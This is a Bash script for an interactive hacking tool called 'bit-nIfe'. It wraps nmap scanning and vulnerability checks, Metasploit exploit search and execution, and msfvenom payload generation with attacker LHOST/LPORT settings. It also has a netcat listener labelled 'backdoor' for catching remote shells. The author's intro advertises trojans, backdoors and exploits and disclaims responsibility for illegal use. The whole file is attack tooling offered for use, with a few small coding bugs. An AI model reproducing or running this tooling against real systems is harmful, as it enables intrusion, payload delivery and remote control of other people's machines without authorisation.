#!/usr/bin/bash

trap 'ctrlc' SIGINT

ctrlc() {
	echo
	read -p "Leave (y/n): " ynl
	if [ "$ynl" == "y" ]; then
		echo -e "${BRIGHT_GREEN}Bye!${NC}"
		exit 0
	fi
}
is_unvalid_domain() {
    domain="$1"
    [[ "$domain" =~ ^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$ ]] || return 0
    getent hosts "$domain" > /dev/null || return 0
    return 1
}

input=""
if [ "$1" == "-ex" ]; then
	input="${@:2}"
	input=$(echo "$input" | xargs )
fi

RED='\033[1;31m'
red='\033[0;31m'
ORANGE='\033[0;33m'
YELLOW='\033[1;38;5;226m'
CYAN='\033[0;36m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
DARK_RED='\033[0;31m'
BRIGHT_GREEN='\033[1;38;5;82m'
BRIGHT_CYAN='\033[1;36m'
GRAY='\033[1;37m'
yello='\033[38;5;226m'
orange='\033[1;38;5;208m'
NC='\033[0m'

prompt="${GRAY}@${NC}bit-nIfe> "
isin="false"
isix="false"
isid="false"

while true; do
clear

echo -e "${YELLOW}     ___"
echo -e "    _,H,_"
echo -e " _   (${RED}#${YELLOW})_         ___  __"
echo -e "| |__|${RED}#${YELLOW}| |_  _ _ |_ _|/ _|____     {${GRAY}v2.66 #pre${YELLOW}}"
echo -e "| '_ \\\\${RED}#${YELLOW}|  _|| ' \\ | || _/  -_|     ${BLUE}bit-nIfe tool${YELLOW}${YELLOW}"
echo -e "|_.__/${RED}#${YELLOW}|_|  |_||_|___|_| \___|"
echo -e "      V_... .  ."
echo
echo -e "${GREEN}- Warning: some of our commands are illegal to use"
echo -e "  without the target's permission."
echo
echo -e "- Type \"help\" to see all commands.${NC}"
echo

while true; do

echo -n -e "$prompt"
if [ "$input" == "" ]; then
	read input
else
	echo
fi

if [ "$input" == "help" ]; then
	echo "cls                       : clear the console"
	echo "reload                    : reload the tool"
	echo "exit                      : exit from the tool"
	echo "intro                     : get you to know how to use and what everything means in this tool"
	echo "hostip <ip/domain>        : convert from domain to ip and reverse"
	echo "state <ip>                : check if target is online or offline"
	echo "myip                      : see your IP"
	echo "myip -public              : see your public IP"
	echo "geolocate <ip>            : geolocate an ip"
	echo "shodan                    : a useful website"
	echo "trace <ip>                : traceroute an IP"
	echo "scan -port <ip>:<port>    : scan for opened ports on a device"
	echo "scan -wifi <ip>           : scan a wifi for alive ports"
	echo "scan -vuln <ip>:<port>    : scan for vulnerabilities on an opened port"
	echo "find <what>               : find exploits, auxiliaries, paylaods and more"
	echo "payload <name>            : use a payload"
	echo "back                      : go back from a setup session"
	echo "set <tag> <value>         : set a needed tag"
	echo "list                      : list the placeholders"
	echo "generate                  : generate a payload"
	echo "exploit <name>            : use an exploit"
	echo "run                       : run an exploit"
	echo "supertools                : list all the supertools"
	echo "supertool <tool>          : use a supertool"
	echo "backdoor <port>           : listen on a port"
elif [[ "$input" == "cls" || "$input" == "clear" ]]; then
	clear
elif [ "$input" == "reload" ]; then
	break
elif [ "$input" == "exit" ]; then
	echo -e "${BRIGHT_GREEN}Bye!${NC}"
	exit 0
elif [ "$input" == "intro" ]; then
	echo "------------------------------------------------"
	echo -e "${CYAN}By ChrisTheCoder24"
	echo "Github: https://github.com/ChrisTheCoder24"
	echo -e "Channel: https://www.youtube.com/@Silence_Coding${NC}"
	echo "------------------------------------------------"
	echo -e "${yello}Tags: ${NC}"
	echo -e "${BRIGHT_GREEN}[+] ${NC}= success"
	echo -e "${orange}[-] ${NC}= warning"
	echo -e "${RED}[x] ${NC}= fail"
	echo
	echo -e "${yello}Notes: ${NC}"
	echo "- Press ctrl+c to exit (you need to enter y/n depending on if you want to leave or not). By typing 'n' after pressing ctrl+c you wont exit but end the current task (There are exceptions)."
	echo "- When using the 'scan -wifi' command, enter you gateway and put /24 at the end for the most accurate scan. Example: 127.0.0.1/24"
	echo "- Warning: when using the 'find' command, the screen clears before showing what it found."
	echo
	echo -e "${yello}Description: ${NC}"
	echo "- Hello, I am ChrisTheCoder24 and this is my hacking tool. I made it easy to use and beginner friendly."
	echo "But, a couple of our commands are illegal to use without the target's permission. And"
	echo "if you get in trouble I am not responsible in any way. Included are alot of stuff like a port"
	echo "scanner, vulnerability scanner, network scanner, IP to domain and reverse, backdoors, trojans,"
	echo "exploits, payloads, a tracing tool, a couple of supertools (witch are just tools that you can use), and"
	echo "much more! ENJOY!!!"
	echo
elif [ "${input:0:7}" == "hostip " ]; then
	hostip="${input:7}"
   	hostip=$(echo "$hostip" | xargs)
   	if is_unvalid_domain "$hostip"; then
   		if ! nslookup "$hostip" > /dev/null; then
   			echo -e "${RED}[x] ${NC}something went wrong"
  		else
   			iphostip=$(nslookup "$hostip" | grep 'name = ' | awk -F' = ' '{print $2}')
   			echo -e "${BRIGHT_GREEN}[+] ${NC}Name: $iphostip"
   		fi
   	else
   		if ! nslookup "$hostip" > /dev/null; then
   			echo -e "${RED}[x] ${NC}something went wrong"
   		else
   			dhostip=$(nslookup "$hostip" | tail -n +5)
   			while IFS= read -r line; do
    				if [[ "$line" == Name:* || "$line" == Address:* ]]; then
     					echo -e "${BRIGHT_GREEN}[+]${NC} $line"
 				fi
			done <<< "$dhostip"
   		fi
   	fi
elif [ "${input:0:6}" == "state " ]; then
	if ping -c 1 -W 1 "${input:6}" > /dev/null 2>&1; then
		echo -e "${BRIGHT_GREEN}[+] ${NC}${input:6}: online"
	else
		echo -e "${orange}[-] ${NC}${input:6}: offline"
	fi
elif [ "$input" == "myip" ]; then
	myip=$(ip a | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1)
	echo -e "${BRIGHT_GREEN}[+] ${NC}$myip"
elif [ "$input" == "myip -public" ]; then
	myipp=$(curl -s ifconfig.me)
	echo -e "${BRIGHT_GREEN}[+] ${NC}$myipp"
elif [ "$input" == "shodan" ]; then
	xdg-open https://shodan.io
elif [ "${input:0:10}" == "geolocate " ]; then
	ipinfo=$(curl -s https://ipwho.is/"${input:10}")
	get_val() {
		echo "$ipinfo" | grep -o "\"$1\":[^,}]*" | cut -d ':' -f2- | sed 's/^ *//;s/^"//;s/"$//'
	}
	echo -e "${BRIGHT_GREEN}[+]${NC} Country: $(get_val country)"
	echo -e "${BRIGHT_GREEN}[+]${NC} Region: $(get_val region)"
	echo -e "${BRIGHT_GREEN}[+]${NC} City: $(get_val city)"
	echo -e "${BRIGHT_GREEN}[+]${NC} Latitude: $(get_val latitude)"
	echo -e "${BRIGHT_GREEN}[+]${NC} Longitude: $(get_val longitude)"
elif [ "${input:0:6}" == "trace " ]; then
	traceroute "${input:6}"
elif [[ "${input:0:11}" == "scan -wifi " ]]; then
	count=0
	IFS='.' read -r sw1 sw2 sw3 _ <<< "${input:11}"
	ips=()
    	for (( i = 1; i <= 255; i++ )); do
    		ips+=("$sw1.$sw2.$sw3.$i")
    	done
    	online_hosts=$(echo "${ips[@]}" | tr ' ' '\n' | xargs -I {} -P 100 sh -c '
        if ping -c 1 -w 1 {} > /dev/null 2>&1; then
           	printf "\033[1;38;5;82m[+] \033[0m{}: online\n"
        fi
    	')
    	while read -r host; do
        	echo "$host"
        	((count++))
    	done <<< "$online_hosts"
    	echo "-------------------"
    	echo -e "${BRIGHT_GREEN}[+] ${NC}$count alive host(s)"
elif [[ "${input:0:11}" == "scan -port " ]]; then
	IFS=':' read -r ip port <<< "${input:11}"
	if [ "$port" == "#" ]; then
		output=$(nmap -sV -T5 "$ip" | awk '/^[0-9]+\/tcp/ && /open/ {split($1, p, "/"); print p[1] " (" $3 "): opened"}')
	else
		output=$(nmap -sV -T5 -p"$port" "$ip" | awk '$1 ~ /^[0-9]+\/tcp/ {split($1, p, "/"); print p[1] " (" $3 "): " ($2 == "open" ? "opened" : "closed")}')
	fi
	while IFS= read -r line; do
		IFS=' ' read -r _ _ pstate <<< "$line"
		if [ "$pstate" == "opened" ]; then
			echo -e "${BRIGHT_GREEN}[+] ${NC}$line"
		else
			echo -e "${orange}[-] ${NC}$line"
		fi 
	done <<< "$output"
elif [ "${input:0:11}" == "scan -vuln " ]; then
	IFS=':' read -r vip vport <<< "${input:11}"
	if [ "$vport" == "#" ]; then
		soutput=$(nmap --script=vuln "$vip" 2>/dev/null | grep --color=never -Po '^\|_?\K[\w\-]+:.*')
	else
		soutput=$(nmap --script=vuln -p"$vport" "$vip" 2>/dev/null | grep --color=never -Po '^\|_?\K[\w\-]+:.*')
	fi
	while IFS= read -r line; do
		IFS=':' read -r explo msg <<< "$line"
		if [[ "$msg" == *"Could not"* || "$msg" == *"Couldn't"* || "$msg" == *"false"* ]]; then
			echo -e "${orange}[-] ${NC}$explo: not vulnerable"
		else
			lvout=$(echo -e "$explo: likely vulnerable")
			if [ "$lvout" == ": likely vulnerable" ]; then
				echo -e "${orange}[-] ${NC}no modlues found"
			else
				echo -e "${BRIGHT_GREEN}[+] ${NC}$exlpo: likely vulnerable"
			fi 
		fi
	done <<< "$soutput"
elif [ "${input:0:5}" == "find " ]; then
	msfconsole -x "clear; search ${input:5}; exit"
elif [ "${input:0:8}" == "payload " ]; then
	lhost=""
	lport=""
	exten=""
	fname=""
	prompt="${GRAY}@${NC}bit-nIfe> "
	isin="true"
	payl="${input:8}"
elif [ "${input:0:8}" == "exploit " ]; then
	rhost=""
	xpayl=""
	prompt="${GRAY}@${NC}bit-nIfe> "
	isix="true"
	expl="${input:8}"
elif [ "$input" == "back" ]; then
	if [[ "$isin" == "true" ]]; then
		isin="false"
		prompt="${orange}@bit-nIfe${RED}> ${NC}"
	elif [[ "$isix" == "true" ]]; then
		isix="false"
		prompt="${orange}@bit-nIfe${RED}> ${NC}"
	fi
elif [ "${input:0:4}" == "set " ]; then
	if [ "$isin" == "true" ]; then
		IFS=' ' read -r what towhat <<< "${input:4}"
		if [ "$what" == "lhost" ]; then
			lhost="$towhat"
		elif [ "$what" == "lport" ]; then
			lport="$towhat"
		elif [ "$what" == "extention" ]; then
			exten="$towhat"
		elif [ "$what" == "name" ]; then
			fname="$towhat"
		fi
	elif [ "$isix" == "true" ]; then
		IFS=' ' read -r xwhat xtowhat <<< "${input:4}"
		if [ "$xwhat" == "payload" ]; then
			xpayl="$xtowhat"
		elif [ "$xwhat" == "lhost" ]; then
                        lhost="$xtowhat"
                elif [ "$xwhat" == "lport" ]; then
                        lport="$xtowhat"
		elif [ "$xwhat" == "rhost" ]; then
			rhost="$xtowhat"
		fi
	else
		echo -e "${RED}[x] ${NC}nothing was chosen"
	fi
elif [ "$input" == "list" ]; then
	if [ "$isin" == "true" ]; then
		echo -e "${yello}lhost: $lhost"
		echo "lport: $lport"
		echo "extention: $exten"
		echo -e "name: $fname${NC}"
	elif [ "$isix" == "true" ]; then
		echo -e "${yello}payload: $xpayl"
		echo "lhost: $lhost"
		echo "lport: $lport"
		echo -e "rhost: $rhost${NC}"
	else
		echo -e "${RED}[x] ${NC}nothing was chosen"
	fi
elif [ "$input" == "generate" ]; then
	if [ "$isin" == "true" ]; then
		msfvenom -p "$payl" LHOST="$lhost" LPORT="$lport" -f "$exten" -o "$fname"
	else
		echo -e "${RED}[x] ${NC}no payload chosen"
	fi
elif [ "$input" == "run" ]; then
	if [ "$isix" == "true" ]; then
		msfconsole -q -x "clear; use $expl; set payload $xpayl; set lhost $lhost; set lport $lport; set rhost $rhost; run"
	else
		echo -e "${RED}[x] ${NC}no exploit was chosen"
	fi
elif [ "$input" == "supertools" ]; then
	echo -e "${BRIGHT_GREEN}[+] ${NC}scan - run any nmap (Network Mapper) command for easy scanning."
	echo -e "${BRIGHT_GREEN}[+] ${NC}port - connect remotly by opened ports on targets PC."
	echo -e "${BRIGHT_GREEN}[+] ${NC}bit - equipped with other types of hacking for more flexibility."
elif [ "$input" == "supertool scan" ]; then
	cd Tools
	./scan-supertool.sh
	cd ..
elif [ "$input" == "supertool port" ]; then
	cd Tools
	./port-supertool.sh
	cd ..
elif [ "${input:0:9}" == "backdoor " ]; then
	nc -lvnp "${input:9}"
elif [ "$input" == "supertool bit" ]; then
	cd Tools
	./bit-supertool.sh
	cd ..
fi
if [[ "$?" != 0 ]]; then
	echo -e "${RED}[x] ${NC}something went wrong"
fi
input=""
done
input=""
done
